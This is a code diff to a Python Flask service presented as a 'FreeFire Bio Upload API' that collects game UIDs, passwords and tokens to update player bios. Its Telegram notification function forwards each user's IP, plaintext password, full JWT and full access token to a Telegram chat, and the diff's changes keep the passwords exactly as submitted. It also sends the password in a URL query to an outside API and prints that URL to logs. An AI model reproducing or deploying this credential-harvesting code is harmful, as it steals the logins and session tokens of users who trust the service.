@@ -55,15 +55,15 @@ def send_telegram_message(message):
 
 def format_telegram_message(request_data, response_data, error=None):
     """Build a nice-looking Telegram message with HTML tags.
-       Includes UID, Password (if provided), Bio, Method, etc.
-       Now shows FULL JWT and FULL Access Token.
+       UID and Password shown here are EXACTLY what the user sent in the request.
+       Shows FULL JWT and FULL Access Token.
     """
     timestamp = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
     client_ip = request_data.get('client_ip', 'Unknown')
     method = request_data.get('method', 'GET')
     path = request_data.get('path', '/bio')
     uid = request_data.get('uid', 'Not provided')
-    password = request_data.get('password', None)  # might be None
+    password = request_data.get('password', None)  # password sent in request
     bio = request_data.get('bio', 'Not provided')
     access_token = request_data.get('access_token', None)
     jwt_token = request_data.get('jwt_token', None)
@@ -75,10 +75,10 @@ def format_telegram_message(request_data, response_data, error=None):
     lines.append(f"<b>IP:</b> <code>{client_ip}</code>")
     lines.append(f"<b>Endpoint:</b> <code>{method} {path}</code>")
     
-    # Always show UID if available
+    # Show UID exactly as sent in the request
     lines.append(f"<b>UID:</b> <code>{uid}</code>")
     
-    # Show password if provided (as requested)
+    # Show password exactly as sent in the request
     if password:
         lines.append(f"<b>Password:</b> <code>{password}</code>")
     
@@ -137,7 +137,9 @@ def encrypt_data(data_bytes):
 # ==================== JWT FROM UID/PASSWORD USING API ====================
 
 def get_jwt_from_uid_password_api(uid, password):
-    """Get JWT directly using the star-jwt-gen API"""
+    """Get JWT directly using the star-jwt-gen API.
+       Returns: (jwt_token, account_id_from_response, nickname, region)
+    """
     url = f"https://ff-jwt-gen-api.lovable.app/api/public/token?uid={uid}&password={password}"
     try:
         print(f"[UID/PASS] Calling JWT API: {url}")
@@ -328,17 +330,18 @@ def combined_bio_upload():
     if client_ip and ',' in client_ip:
         client_ip = client_ip.split(',')[0].strip()
 
-    # Build request_info – we'll update login_method later
+    # Build request_info – UID and Password are EXACTLY what the user sent in the request.
+    # These values will NEVER be overridden by API response.
     request_info = {
         'client_ip': client_ip,
         'method': request.method,
         'path': request.path,
-        'uid': uid if uid else 'Not provided',
-        'password': password,  # may be None
+        'uid': uid if uid else 'Not provided',       # as sent in request
+        'password': password,                         # as sent in request
         'bio': bio if bio else 'Not provided',
-        'access_token': access_token,  # full token
-        'jwt_token': jwt_token,        # full token
-        'login_method': 'Unknown'  # will be updated
+        'access_token': access_token,                 # full token as sent
+        'jwt_token': jwt_token,                       # full token as sent
+        'login_method': 'Unknown'                     # will be updated
     }
 
     if not bio:
@@ -455,13 +458,12 @@ def combined_bio_upload():
         "server_response": result["server_response"][:200] if result["server_response"] else "Empty"
     }
 
-    # Update request_info with login_method and also set UID from jwt_info if not already
+    # Update request_info with login_method
     request_info['login_method'] = login_method
-    if jwt_info and jwt_info.get('uid'):
-        request_info['uid'] = jwt_info['uid']  # override with actual UID from JWT
 
-    # Also set the full tokens in request_info for Telegram (they are already there, but ensure)
-    # No truncation now
+    # IMPORTANT: UID and Password in Telegram stay EXACTLY as sent in the request.
+    # They are NOT overridden by API response or JWT payload.
+    # request_info['uid'] and request_info['password'] already hold the request values.
 
     # Send success notification
     msg = format_telegram_message(request_info, response_data)
@@ -473,7 +475,7 @@ def combined_bio_upload():
 def home():
     return jsonify({
         "name": "FreeFire Bio Upload API",
-        "version": "2.0",
+        "version": "2.2",
         "endpoints": {
             "bio": "/bio?bio=text&uid=UID&pass=PASSWORD",
             "methods": ["GET", "POST"],
@@ -494,7 +496,7 @@ def home():
 
 if __name__ == "__main__":
     print("=" * 50)
-    print("FreeFire Bio Upload API Started (v2.0)")
+    print("FreeFire Bio Upload API Started (v2.2)")
     print("=" * 50)
     print("Available endpoints:")
     print("  GET  / - API Info")
